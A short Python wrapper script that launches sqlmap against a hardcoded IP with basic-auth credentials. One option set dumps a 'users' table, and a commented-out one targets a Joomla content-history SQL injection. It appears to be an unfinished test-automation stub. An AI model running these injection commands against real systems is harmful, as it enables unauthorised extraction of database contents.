#!/usr/local/bin/python3.5

"""
Wrapper around the sqlmap tool. This wrapper provides 
convenient methods for executing sqlmap and parsing its 
output.
"""
#import ../global_var
import subprocess
import pexpect
from sys import platform as _platform

#options = " --auth-type=basic --auth-cred=regis:password -u https://157.27.244.25/joomla3.4.4/index.php?option=com_contenthistory&view=history&list[select]=injection -p list[select] -T ppdqj_session --v 3"
options = " --auth-type=basic --auth-cred=regis:password -u https://157.27.244.25/chained/chained/index.php -T users --v 3"
SQLMAP_LOCATION = "xterm -e ./sqlmap/sqlmap.py" + options

# notes: sqlmap executes and, at the ends, report a log in ~/.sqlmap/ folder
# probably the best option is to not capture the output from sqlmap, but to
# retrieve it from that folder after the execution.

# write a python wrapper for the sqlmapapi.py script

# run sqlmap with the specified arguments
def exec_sqlmap(params):
    print("Executing sqlmap on a new window")

    if _platform == "linux" or _platform == "linux2":
        # linux
        print("linux not supported at this moment")
    elif _platform == "darwin":
        # OS X
        ret = sqlmap_process = subprocess.call(SQLMAP_LOCATION.split(" "),universal_newlines=True,stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        print(ret)
    elif _platform == "win32":
        print("windows not supported")

# when sqlmap dumps something, it is saved in ~/.sqlmap/output/<target>/dump/

def retrieve_sqlmap_result():
        print("reading result")


if __name__ == "__main__":
    exec_sqlmap(False)

